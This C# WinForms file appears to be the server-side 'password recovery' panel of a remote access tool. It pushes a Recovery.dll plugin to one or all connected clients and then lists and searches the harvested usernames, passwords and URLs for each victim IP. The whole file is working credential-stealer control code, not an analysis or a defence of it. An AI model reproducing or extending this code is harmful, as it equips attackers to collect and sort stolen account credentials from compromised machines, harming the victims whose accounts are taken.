using Newtonsoft.Json.Linq;
using Server.Algorithm;
using Server.Connection;
using Server.Handle_Packet;
using Server.MessagePack;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server.Forms
{
    public partial class FromRecovery : Form
    {
        public FromRecovery()
        {
            InitializeComponent();
        }

        private void btnRefresh_Click(object sender, EventArgs e)
        {
            ViewAll();
        }
        public void ViewClient(Clients cl)
        {
            listViewClients.Clear();
            listViewPasswords.Items.Clear();
            listViewPasswords.Groups.Clear();

            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
            string dllstr = GetHash.GetChecksum(@"Plugins\Recovery.dll");
            msgpack.ForcePathObject("Dll").AsString = dllstr;

            ThreadPool.QueueUserWorkItem(cl.Send, msgpack.Encode2Bytes());
            new HandleLogs().Addmsg($"Fetching passwords From {cl.Ip}...", Color.Black);
        }
        public void ViewAll()
        {
            listViewClients.Clear();
            listViewPasswords.Items.Clear();
            listViewPasswords.Groups.Clear();

            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
            string dllstr = GetHash.GetChecksum(@"Plugins\Recovery.dll");
            msgpack.ForcePathObject("Dll").AsString = dllstr;

            foreach (Clients client in Settings.GetAllClients())
                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
            new HandleLogs().Addmsg("Fetching all passwords...", Color.Black);
        }

        private void ShowClient(string hwid, string ip, string txtfilter = null,
            bool nameflag = false, bool passflag = false, bool urlflag = true)
        {
            string fullPath = Path.Combine(Application.StartupPath,
                    "ClientsFolder", hwid, "Recovery");
            string filename = $"{fullPath}\\Password.txt";
            if (File.Exists(filename))
            {
                string jsontxt = File.ReadAllText(filename);
                if (txtfilter == null)
                {
                    listViewPasswords.Items.Clear();
                    listViewPasswords.Groups.Clear();
                }
                try
                {
                    JObject root = JObject.Parse(jsontxt);
                    foreach (var item in root.Children())
                    {
                        string name = item.Path;
                        bool existflag = false;
                        ListViewGroup cur_grp = null;
                        foreach (ListViewGroup grp in listViewPasswords.Groups)
                        {
                            if (name == grp.Name)
                            {
                                cur_grp = grp;
                                existflag = true; break;
                            }
                        }
                        if (!existflag)
                        {
                            cur_grp = new ListViewGroup(name) { Name = name };
                            listViewPasswords.Groups.Add(cur_grp);
                        }

                        JArray ar = (JArray)root[name];
                        foreach (var passitem in ar)
                        {
                            string sname = passitem.Value<string>("sUsername");
                            string spass = passitem.Value<string>("sPassword");
                            string surl = passitem.Value<string>("sUrl");
                            if (string.IsNullOrEmpty(sname) || string.IsNullOrEmpty(surl)) continue;
                            if (!string.IsNullOrEmpty(txtfilter))
                            {
                                bool findflag = false;
                                if (nameflag && sname.ToLower().Contains(txtfilter)) findflag = true;
                                if (passflag && spass.ToLower().Contains(txtfilter)) findflag = true;
                                if (urlflag && surl.ToLower().Contains(txtfilter)) findflag = true;
                                if (!findflag) continue;
                            }
                            ListViewItem litem = new ListViewItem(sname);
                            litem.SubItems.Add(spass);
                            litem.SubItems.Add(surl);
                            litem.SubItems.Add(ip);
                            litem.Group = cur_grp;
                            listViewPasswords.Items.Add(litem);
                        }
                    }
                }
                catch (Exception) { }
            }
        }

        public void AddClient(Clients cl)
        {
            listViewClients.Items.Add(new ListViewItem { Text = cl.Ip, Tag = cl.ID });
            ShowClient(cl.ID, cl.Ip);
        }

        private void listViewClients_SelectedIndexChanged(object sender, EventArgs e)
        {
            try
            {
                string hwid = (string)listViewClients.SelectedItems[0].Tag;
                string ip = listViewClients.SelectedItems[0].Text;
                ShowClient(hwid, ip);
            }
            catch (Exception) { }
        }

        private void txtsearch_TextChanged(object sender, EventArgs e)
        {
            string txt = txtsearch.Text;
            listViewPasswords.Items.Clear();
            listViewPasswords.Groups.Clear();
            try
            {
                if (chkAll.Checked)
                {
                    foreach (ListViewItem item in listViewClients.Items)
                    {
                        string hwid = (string)item.Tag, ip = item.Text;
                        ShowClient(hwid, ip,txt, chkName.Checked, chkPassword.Checked, chkUrl.Checked);
                    }
                        
                }
                else
                {
                    foreach (ListViewItem item in listViewClients.SelectedItems)
                    {
                        string hwid = (string)item.Tag, ip = item.Text;
                        ShowClient(hwid, ip, txt, chkName.Checked, chkPassword.Checked, chkUrl.Checked);
                    }
                }
            }
            catch (Exception) { }
        }
    }
}
